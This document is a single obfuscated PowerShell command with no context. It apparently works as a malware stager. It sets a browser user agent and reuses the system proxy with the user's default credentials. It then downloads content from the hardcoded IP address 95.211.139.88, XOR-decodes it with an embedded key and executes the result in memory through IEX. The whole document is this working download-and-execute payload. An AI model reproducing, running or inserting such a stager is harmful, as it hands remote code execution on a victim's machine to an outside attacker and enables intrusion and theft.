
$WC=NeW-OBJect SyStEM.NEt.WeBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERS.AdD('User-Agent',$u);$wC.PROXY = [SYSTEM.Net.WeBREQuesT]::DEFAulTWEBPROXy;$Wc.PRoXy.CReDEnTIalS = [SystEm.NET.CREdEnTiaLCAche]::DeFAuLTNETWorkCreDenTiaLS;$K='\o9Kylpr(IGJF}C^2qd/=]s3Zfe_P<*H';$I=0;[chaR[]]$B=([chAr[]]($Wc.DowNLOAdStrinG("http://95.211.139.88:80/index.asp")))|%{$_-BXOR$K[$I++%$K.LENgTh]};IEX ($B-JOIN'')

